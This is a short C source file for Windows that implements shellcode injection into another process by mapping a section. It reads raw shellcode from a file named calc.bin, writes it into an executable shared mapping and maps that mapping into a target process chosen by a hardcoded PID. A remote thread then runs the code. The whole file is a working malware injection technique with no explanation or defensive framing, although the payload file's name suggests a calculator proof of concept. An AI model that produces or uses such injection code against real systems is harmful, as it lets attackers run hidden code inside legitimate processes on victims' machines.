#define _CRT_SECURE_NO_WARNINGS
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <memoryapi.h>



int RemoteMapExec(DWORD pid, PBYTE sc, size_t sc_size) {
	PVOID local_addr = NULL,
		  remote_addr = NULL;
	HANDLE fHand = NULL;
	HANDLE hProcess = NULL;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
	if (hProcess == NULL) {
		printf("Failed opening process: %d\n", GetLastError());
		goto _Cleanup;
	}

	fHand = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sc_size, NULL);
	if (fHand == NULL) {
		printf("Failed creating local map: %d\n", GetLastError());
		goto _Cleanup;
	}

	local_addr = MapViewOfFile(fHand, FILE_MAP_WRITE, NULL, NULL, sc_size);
	if (local_addr == NULL) {
		printf("Mapping the file view failed: %d\n", GetLastError());
		goto _Cleanup;
	}

	memcpy(local_addr, sc, sc_size);


	remote_addr = MapViewOfFileNuma2(fHand, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READ, NUMA_NO_PREFERRED_NODE);
	if (remote_addr == NULL) {
		printf("Remote mapping failed: %d\n", GetLastError());
		goto _Cleanup;
	}

	HANDLE hThread = NULL;
	hThread = CreateRemoteThread(hProcess, NULL, NULL, remote_addr, NULL, NULL, NULL);
	if (hThread == NULL) {
		printf("CreateRemoteThread failed: %d\n", GetLastError());
		goto _Cleanup;
	}
	return 0;

    _Cleanup:
	    CloseHandle(hProcess);
		CloseHandle(fHand);
		return 1;
}



//Read the shellcode from file
int ReadF(const char* file_path, long* file_size, char** read_buffer) {
	FILE* file;

	file = fopen(file_path, "rb");
	if (file == NULL) {
		printf("Error opening file: %s", file_path);
		*file_size = 0;
		return 1;
	}

	fseek(file, 0, SEEK_END);
	*file_size = ftell(file);
	rewind(file);

	*read_buffer = (char*)malloc(*file_size * sizeof(char));
	if (*read_buffer == NULL) {
		printf("Memory allocation failed");
		fclose(file);
		return 1;
	}

	fread(*read_buffer, 1, *file_size, file);
	fclose(file);
	return 0;
}


int main()
{
	DWORD pid = 9412;
	long sc_size;
	char* sc;
	ReadF("C:\\Users\\nullb1t3\\Desktop\\calc.bin", &sc_size, &sc);

	PVOID remote_addr = NULL;
	RemoteMapExec(pid, sc, sc_size);

    return 0;
}

